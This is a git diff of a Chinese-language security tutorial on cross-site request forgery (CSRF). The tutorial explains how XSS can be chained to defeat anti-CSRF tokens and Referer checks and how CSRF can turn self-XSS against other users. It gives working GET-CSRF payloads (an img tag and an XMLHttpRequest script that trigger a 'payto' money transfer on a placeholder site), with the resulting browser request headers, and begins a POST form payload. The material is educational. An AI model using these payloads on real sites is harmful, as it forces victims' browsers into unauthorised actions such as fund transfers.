@@ -17,32 +17,39 @@ CSRF通过构造get/post等请求，设法使已登录用户victim不知情的�
   * GET - 利用方式 使victim点击构造的url 发出GET请求 `http://get.csrfvul.com/payto?name=hacker&moneynumb=100`
   * POST - 利用方式 尝试转变为GET (可尝试将post请求体改成get形式放至url参数中 如果可以正常响应 则可以使用GET请求进行csrf攻击)
 
-### 利用CSRF实现攻击
+### 漏洞危害
 
-* 漏洞联合 - 使用XSS可绕过CSRF保护机制 无交互地利用CSRF漏洞 有以下场景:
-   * 1.利用自身域名的XSS漏洞绕过CSRF防御机制 - 很多anti-CSRF机制原理是判断HTTP请求中的CSRFtoken的值，当只存在XSS漏洞时，可使用JavaScript找到csrf-token参数值(需要看csrf-token的具体位置)，并构造出携带csrf-toekn的HTTP请求 可通过后端对csrf-token的验证 实现CSRF攻击
-   * 2.利用自身/兄弟/父子域名的XSS漏洞绕过CSRF防御机制 - 有的anti-CSRF机制是后端通过判断Referer的值，如果Referer的值 是自身/兄弟/父子域名下的url 就是"合法"请求
-   * 如果有html注入漏洞 也是同理
+#### 【危害1】漏洞联合 - 利用XSS可绕过CSRF保护机制 无交互地利用CSRF漏洞 
+
+* 场景:
+   * 1.利用自身域名下存在的XSS漏洞 绕过CSRF防御机制 - 很多anti-CSRF机制原理是判断HTTP请求中的CSRFtoken的值，当只存在XSS漏洞时，可使用JavaScript找到csrf-token参数值(需要看csrf-token的具体位置)，并构造出携带csrf-toekn的HTTP请求 可通过后端对csrf-token的验证 实现CSRF攻击
+   * 2.利用自身/兄弟/父子域名下存在的XSS漏洞 绕过CSRF防御机制 - 有的anti-CSRF机制是后端通过判断Referer的值，如果Referer的值 是自身/兄弟/父子域名下的url 就是"合法"请求
 
 |csrf-token位置|获取方法|描述|
 |:---:|---|-------|
 |html代码form表单|略||
 |cookie|略|注意如果是HTTP-only的cookie就难以获取|
 
+---
 
-* 漏洞联合 - CSRF漏洞 可使self-XSS漏洞"变废为宝"
-  * 场景 - `vul.com`存在self-XSS漏洞和CSRF漏洞，而直接利用self-XSS漏洞则victim只能是自己，如何实现self-XSS去攻击自己以外的目标?
-  * 目标 - 通过借助CSRF漏洞，使XSSpayload能够攻击自己以外的目标
-  * 过程 - 可在攻击者可控的第三方网站`https://3.com`下利用`vul.com`的CSRF漏洞:通过多种方法(如JavaScript)都可以构造出跨域HTTP请求发送到`vul.com`，其中RequestBody的内容包含了"能够触发self-XSS漏洞的payload"，所以当victim访问第三方网站`https://3.com`时，会发出CSRF请求到`vul.com`，则该用户在`vul.com`域下被XSS攻击
+#### 【危害2】漏洞联合 - CSRF漏洞 使 self-XSS漏洞"变废为宝"
 
+  * 场景 - `vul.com`存在self-XSS漏洞和CSRF漏洞，如果直接利用self-XSS漏洞则victim只能是自己，如何攻击自己以外的目标?
+  * 目标 - 通过利用CSRF漏洞，使XSSpayload能够攻击自己以外的目标
+  * 过程
+    * 构造:攻击者利用CSRF漏洞构造出HTTP请求发向`vul.com` 其中HTTP Request Body中包含了"能够触发self-XSS漏洞的payload"
+    * 触发:所以当victim(点击链接等方式)触发CSRF漏洞时，会发出HTTP请求到`vul.com`，实现victim在`vul.com`域下被XSS攻击
 
-#### 利用CSRF漏洞发出GET请求
+#### 【危害3】利用CSRF漏洞发出GET请求
 
 * 场景
-  * 攻击者可控的第三方域:`www.3.com`会被victim访问
-  * 目标域存在CSRF漏洞
+  * 目标域`csrfvul.com`存在CSRF漏洞
+  * 攻击者可控的域`www.3.com` 某web页面的前端代码可向目标域`csrfvul.com`发出请求 如果该页面被victim访问则触发CSRF
+* 利用过程
+  * 1.攻击者通过多种办法(如JavaScript) 在 `http://www.3.com/demo` 中注入代码
+  * 2.victim访问`http://www.3.com/demo` 实现GET-CSRF
 
-通过多种办法(如JavaScript) 在 `http://www.3.com/demo` 中注入代码:
+**方法1** 利用`img`标签实现GET-CSRF
 ```
 <img src="http://get.csrfvul.com/payto?name=hacker&moneynumb=100">
 ```
@@ -64,15 +71,65 @@ Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
 ```
 
-#### 利用可控的第三方域 实现CSRF发出POST请求
+----
+
+**方法2** 利用`XMLHttpRequest`实现GET-CSRF
+
+* 这种利用`XMLHttpRequest`的CSRF方法,通常仅适用于【同域】下利用CSRF.
+* 如果跨域就需要遵循CORS策略,这种方法通常很难实现跨域触发.
+* 因为`XMLHttpRequest`跨域必须遵循CORS策略. 所以利用`XMLHttpRequest`实现GET-CSRF的【前提条件】很高:
+* 目标站点`csrfvul.com`的HTTP Response Header中的`Access-Control-Allow-Origin:`中明确允许了来自某第三方域名`3.com`跨域请求,才能跨域成功
+
+```
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "https://www.get.csrfvul.com/payto?name=hacker&moneynumb=100");
+xhr.send();
+</script>
+```
+
+如果victim使用Firefox则发出的请求为:
+```
+GET /payto?name=hacker&moneynumb=100 HTTP/1.1
+Host: www.get.csrfvul.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Origin: https://www.3.com
+Connection: close
+Referer: http://www.3.com/demo
+```
+
+如果victim使用Chrome则发出的请求为:
+```
+GET /payto?name=hacker&moneynumb=100 HTTP/1.1
+Host: www.get.csrfvul.com
+Connection: close
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+Sec-Fetch-Dest: empty
+Accept: */*
+Origin: https://www.3.com
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: cors
+Referer: http://www.3.com/demo
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+```
+可以看到来自第三方域名的、利用`XMLHttpRequest`发起的请求带有HTTP Request Header `Origin: https://www.3.com`
+
+所以,这种利用`XMLHttpRequest`的CSRF方法,通常仅适用于【同域】下利用CSRF.
+
+#### 【危害4】利用可控的第三方域 实现CSRF发出POST请求
 
 * 场景
-  * 攻击者可控的第三方域:`www.3.com`会被victim访问
-  * 目标域存在CSRF漏洞
-
+  * 目标域`csrfvul.com`存在CSRF漏洞
+  * 攻击者可控的域`www.3.com` 某web页面的前端代码可向目标域`csrfvul.com`发出请求 如果该页面被victim访问则触发CSRF
+* 利用过程
+  * 1.攻击者通过通过`XSS/JavaScript`,`HTML注入`等方法，在 `http://www.3.com/demo`中注入代码
+  * 2.victim访问`http://www.3.com/demo` 实现POST-CSRF
 
 * 构造CSRF - 发出POST请求
-  * 通过`XSS/JavaScript`,`HTML注入`等方法 在 `https://www.3.com/demo` 中注入以下html代码
     * `form`标签支持的`enctype`属性的值 只有以下3种: 它可以指定该form表单提交时发出的http请求中的`Content-Type`值
       * 1.`<form enctype="application/x-www-form-urlencoded" ...` 默认情况
       * 2.`<form enctype="text/plain" ...`
